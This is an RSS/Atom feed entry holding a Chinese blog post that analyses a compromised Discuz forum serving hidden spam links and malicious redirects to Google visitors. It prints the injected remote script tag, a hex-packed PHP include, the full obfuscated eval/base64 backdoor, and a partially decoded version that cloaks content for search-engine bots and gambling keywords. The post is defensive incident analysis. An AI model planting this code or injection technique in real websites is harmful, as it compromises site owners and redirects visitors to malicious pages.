<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>看看俺 - KanKanAn.com</title>
  <link href="http://blog.kankanan.comindex.xml" rel="self" />
  <link href="http://blog.kankanan.com"/>
  <updated>2013-04-09T12:00:00Z</updated>
  <id>http://blog.kankanan.comindex.xml</id>
  <entry><title type="html">论坛被挂暗链问题分析与解决</title><author><name>nil</name></author><link href="http://blog.kankanan.com/posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html"/><updated>2014-04-01T21:38:00Z</updated><published>2014-04-01T21:38:00Z</published><id>posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</id><category scheme="/tags/discuz.html" term="discuz" label="discuz"/><category scheme="/tags/security.html" term="security" label="security"/><category scheme="/tags/web.html" term="web" label="web"/><content type="html">&lt;div id="outline-container-1" class="outline-3"&gt;
&lt;h3 id="sec-1"&gt;&#21457;&#29616;&#38382;&#39064;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-1"&gt;


&lt;p&gt;   
   &#26377;&#32593;&#21451;&#21453;&#26144;&#25105;&#20204;&#30340;&#35770;&#22363;&#34987;&#25346;&#20102;&#26263;&#38142;&#65292;&#20855;&#20307;&#34920;&#29616;&#20026;&#20174; &lt;code&gt;google&lt;/code&gt; &#25628;&#32034;&#35770;&#22363;&#21517;&#31216;&#32467;&#26524;&#22914;&#19979;&#22270;&#25152;&#31034;&#65306;
&lt;/p&gt;
&lt;p&gt;
   &lt;img src="../../../posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3/site_attacked.png"  alt="../../../posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3/site_attacked.png" /&gt;
&lt;/p&gt;
&lt;p&gt;   
   &#30452;&#25509;&#25628;&#32034;&#35770;&#22363;&#32593;&#22336;&#20986;&#29616;&#30340;&#19968;&#20123;&#28909;&#38376;&#24086;&#23376;&#20063;&#34987;&#25346;&#20102;&#26263;&#38142;&#65292;&#36890;&#36807; &lt;code&gt;google&lt;/code&gt; &#25628;&#32034;&#32467;&#26524;&#35775;&#38382;&#20250;&#36339;&#21040;&#24694;&#24847;&#32593;&#31449;&#65292;
&lt;/p&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-2" class="outline-3"&gt;
&lt;h3 id="sec-2"&gt;&#35299;&#20915;&#38382;&#39064;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-2"&gt;


&lt;p&gt;
   &#30452;&#25509;&#36890;&#36807;&#32593;&#22336;&#35775;&#38382;&#35770;&#22363;&#21017;&#27809;&#26377;&#20219;&#21153;&#38382;&#39064;&#65292;&#24212;&#35813;&#26159;&#35770;&#22363;&#34987;&#27880;&#20837;&#20102;&#24694;&#24847;&#20195;&#30721;&#65292;&#19968;&#26102;&#27809;&#34987;&#21457;&#29616;&#12290;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&#22312;&#20195;&#30721;&#21644;&#25968;&#25454;&#24211;dump&#32467;&#26524;&#20013;&#25628;&#32034;&#24694;&#24847;&#31449;&#28857;&#20449;&#24687;&#65292;&#19968;&#26080;&#25152;&#33719;

&lt;/li&gt;
&lt;li&gt;&#28982;&#21518;&#24576;&#30097;&#26159;&#29992;&#25143;&#19978;&#20256;&#30340;&#22270;&#29255;&#20013;&#25346;&#20102;&#39532;&#65292;&#29305;&#21035;&#26159;&#32852;&#24819;&#21040;&#39318;&#39029;&#26368;&#36817;&#21018;&#19978;&#28909;&#22270;&#36718;&#25773;&#65292;&#23433;&#35013; &lt;code&gt;firefox&lt;/code&gt; &#25554;&#20214; &lt;code&gt;ImageBlock&lt;/code&gt; &#35753;&#27983;&#35272;&#22120;&#19981;&#21152;&#36733;&#22270;&#29255;&#65292;&#21487;&#26159;&#38382;&#39064;&#20381;&#26087;

&lt;/li&gt;
&lt;li&gt;&#25171;&#24320; &lt;code&gt;firebug&lt;/code&gt; &#30340; &lt;code&gt;Network&lt;/code&gt; &#26631;&#31614;&#65292;&#22312;&#39029;&#38754;&#21152;&#36733;&#35760;&#24405;&#20013;&#21457;&#29616;&#19968;&#20010;&#24322;&#24120;&#30340;js&#21152;&#36733;&#65306; &lt;code&gt;http://api.discuz.com.de/Seo.js&lt;/code&gt; 

&lt;p&gt;     
     &#22312;&#20195;&#30721;&#21644;&#25968;&#25454;&#24211;&#20013;&#25628;&#32034;&#36825;&#20010;js&#25214;&#19981;&#21040;&#20219;&#20309;&#20449;&#24687;&#12290;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&#23558;&#24694;&#24847;&#31449;&#28857;&#37197;&#32622;&#19968;&#26465; &lt;code&gt;hosts&lt;/code&gt; 




&lt;pre class="example"&gt;127.0.0.1 api.discuz.com.de
&lt;/pre&gt;


&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;     &#27983;&#35272;&#22120;&#19981;&#20877;&#33258;&#21160;&#36339;&#36716;&#21040;&#24694;&#24847;&#32593;&#31449;&#20102;&#12290; 
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&#20174; &lt;code&gt;google&lt;/code&gt; &#36339;&#36716;&#21040;&#35770;&#22363;&#21518;&#65292;&#26597;&#30475;&#39029;&#38754;&#28304;&#20195;&#30721;&#22312;&#26368;&#24320;&#22987;&#37096;&#20998;&#21457;&#29616;&#20102;&#24341;&#20837;&#24694;&#24847;js&#30340;&#35821;&#21477;




&lt;pre class="src src-html"&gt;&amp;lt;&lt;span style="color: #edd400; font-weight: bold; font-style: italic;"&gt;div&lt;/span&gt; &lt;span style="color: #eeeeec;"&gt;style&lt;/span&gt;='display:none'&amp;gt;&amp;lt;&lt;span style="color: #edd400; font-weight: bold; font-style: italic;"&gt;script&lt;/span&gt; &lt;span style="color: #eeeeec;"&gt;language&lt;/span&gt;='javascript' &lt;span style="color: #eeeeec;"&gt;src&lt;/span&gt;='http://count31.51yes.com/click.aspx?id=310940343&lt;span style="color: #eeeeec;"&gt;&amp;amp;logo&lt;/span&gt;=1' &lt;span style="color: #eeeeec;"&gt;charset&lt;/span&gt;='gb2312'&amp;gt;&amp;lt;/&lt;span style="color: #edd400; font-weight: bold; font-style: italic;"&gt;script&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style="color: #edd400; font-weight: bold; font-style: italic;"&gt;div&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style="color: #edd400; font-weight: bold; font-style: italic;"&gt;script&lt;/span&gt; &lt;span style="color: #eeeeec;"&gt;type&lt;/span&gt;='text/javascript' &lt;span style="color: #eeeeec;"&gt;src&lt;/span&gt;='http://api.discuz.com.de/Seo.js'&amp;gt;&amp;lt;/&lt;span style="color: #edd400; font-weight: bold; font-style: italic;"&gt;script&lt;/span&gt;&amp;gt;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#22312;php&#33050;&#26412;&#20013;&#21152;&#20837; &lt;code&gt;echo&lt;/code&gt; &#35821;&#21477;&#36880;&#27493;&#32553;&#23567;&#33539;&#22260;&#65292;&#26368;&#32456;&#21457;&#29616;&#38382;&#39064;&#30001;&#19979;&#38754;&#19968;&#26465;&#35821;&#21477;&#24341;&#36215;




&lt;pre class="src src-php"&gt;&lt;span style="color: #729fcf; font-weight: bold;"&gt;INCLUDE&lt;/span&gt;(&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;pack(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'H*'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;));&lt;/span&gt;
&lt;/pre&gt;


&lt;p&gt;
     &#19978;&#38754;&#30340;&#35821;&#21477;&#24341;&#20837;&#20102; &lt;code&gt;/var/tmp/.SYSDUMP/.Wh0AmI.CORE&lt;/code&gt; &#33050;&#26412;&#12290;
&lt;/p&gt;
&lt;p&gt;
     &#21024;&#38500;&#35813;&#35821;&#21477;&#21518;&#38382;&#39064;&#35299;&#20915;&#12290;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-3" class="outline-3"&gt;
&lt;h3 id="sec-3"&gt;&#20998;&#26512;&#24694;&#24847;&#20195;&#30721;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-3"&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/var/tmp/.SYSDUMP/.Wh0AmI.CORE&lt;/code&gt;




&lt;pre class="src src-php"&gt;&lt;span style="color: #729fcf;"&gt;&amp;lt;?php&lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;O00OO0&lt;/span&gt;=&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;urldecode(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#21442;&#32771; &lt;a href="http://blog.i1728.com/post/99.html"&gt;&#32593;&#19978;&#26041;&#27861;&lt;/a&gt; &#35299;&#30721;&#30340;&#32467;&#26524;




&lt;pre class="src src-php"&gt;&lt;span style="color: #729fcf;"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style="color: #888a85;"&gt;/*&lt;/span&gt;
&lt;span style="color: #888a85;"&gt;*author:whoami&lt;/span&gt;
&lt;span style="color: #888a85;"&gt;*  QQ  :4892057&lt;/span&gt;
&lt;span style="color: #888a85;"&gt;*/&lt;/span&gt;
&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;error_reporting(0&lt;/span&gt;);
$&lt;span style="color: #eeeeec;"&gt;fileDir&lt;/span&gt; = &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'/var/tmp/.SYSDUMP/'&lt;/span&gt;;
$&lt;span style="color: #eeeeec;"&gt;IP&lt;/span&gt;=$&lt;span style="color: #8ae234;"&gt;_SERVER&lt;/span&gt;[&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'REMOTE_ADDR'&lt;/span&gt;];
$&lt;span style="color: #eeeeec;"&gt;Bot&lt;/span&gt;=$&lt;span style="color: #8ae234;"&gt;_SERVER&lt;/span&gt;[&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'HTTP_USER_AGENT'&lt;/span&gt;];
$&lt;span style="color: #eeeeec;"&gt;Ref&lt;/span&gt;=$&lt;span style="color: #8ae234;"&gt;_SERVER&lt;/span&gt;[&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'HTTP_REFERER'&lt;/span&gt;];
$&lt;span style="color: #eeeeec;"&gt;KIP&lt;/span&gt;=&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;array(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'117.28.255.37'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'116.55.241.24'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'125.64.94.219'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'119.147.114.213'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'11&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;8.122.188.194','60.172.229.61','61.188.39.16','61.147.98.198','61.129.45.72','113.98.254.245','58.221.61.128','117.34.73.70','58.215.190.84','117.28.255.53','183.91.40.144','117.21.220.245','122.228.200.46','61.164.150.70','61.147.108.41','116.55.242.138','114.80.222.242','61.147.108.41','116.255.230.70','222.186.24.26','222.186.24.59','220.181.158.106','123.125.160.215');&lt;/span&gt;
$&lt;span style="color: #eeeeec;"&gt;KBot&lt;/span&gt;=&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;array(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'Baiduspider'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'Googlebot'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'Yahoo'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'Bingbot'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'Sosospider'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'Sogou'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'36&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;0Spider','YoudaoBot');&lt;/span&gt;
$&lt;span style="color: #eeeeec;"&gt;Key&lt;/span&gt;=&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;array(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'anquan.org'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'google.com'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'soso.com'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'%e8%b5%8c'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'%e9%aa%b0'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'%e9%b1%&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;bc','%e7%89%9b','%e5%8d%9a%e5%bd%a9','%e7%99%be%e5%ae%b6','%e6%a3%8b%e7%89%8c','%e6%b8%b8%e6%88%8f','%e5%a8%b1%e4%b9%90','%e5%9b%bd%e9%99%85','%e7%9c%9f%e4%ba%ba','%e7%9c%9f%e9%92%b1','%e7%8e%b0%e9%87%91','%e6%b3%a8%e5%86%8c','%e5%bc%80%e6%88%b7','%e5%bd%a9%e9%87%91','%e8%b5%9a%e9%92%b1','%e6%8f%90%e7%8e%b0','%e7%ad%96%e7%95%a5','%e8%af%95%e7%8e%a9','%e5%b9%b3%e5%8f%b0','%e5%a4%aa%e9%98%b3%e5%9f%8e','%e4%bd%93%e9%aa%8c%e9%87%91');&lt;/span&gt;
&lt;span style="color: #729fcf; font-weight: bold;"&gt;function&lt;/span&gt; &lt;span style="color: #edd400; font-weight: bold; font-style: italic;"&gt;dec0de&lt;/span&gt;($&lt;span style="color: #eeeeec;"&gt;fileDir&lt;/span&gt;,$&lt;span style="color: #eeeeec;"&gt;data&lt;/span&gt;){
$&lt;span style="color: #eeeeec;"&gt;dataArr&lt;/span&gt; = &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;explode(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;':'&lt;/span&gt;,$&lt;span style="color: #eeeeec;"&gt;data&lt;/span&gt;);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;Keys&lt;/span&gt; = &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;explode(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;':'&lt;/span&gt;,&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;base64_decode(str_rot13(pack(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'H*'&lt;/span&gt;,$&lt;span style="color: #eeeeec;"&gt;dataArr&lt;/span&gt;[&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;0&lt;/span&gt;]))));
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;News&lt;/span&gt; = &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;explode(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;':'&lt;/span&gt;,&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;base64_decode(str_rot13(pack(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'H*'&lt;/span&gt;,$&lt;span style="color: #eeeeec;"&gt;dataArr&lt;/span&gt;[&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;1&lt;/span&gt;]))));
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;Links&lt;/span&gt;= &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;explode(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;':'&lt;/span&gt;,&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;base64_decode(str_rot13(pack(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'H*'&lt;/span&gt;,$&lt;span style="color: #eeeeec;"&gt;dataArr&lt;/span&gt;[&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;2&lt;/span&gt;]))));
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; @&lt;span style="color: #729fcf; font-weight: bold;"&gt;include&lt;/span&gt;($&lt;span style="color: #eeeeec;"&gt;fileDir&lt;/span&gt;.&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'.Wh0AmI.MODEL'&lt;/span&gt;);&lt;span style="color: #f57900; font-weight: bold;"&gt;die&lt;/span&gt;;
}
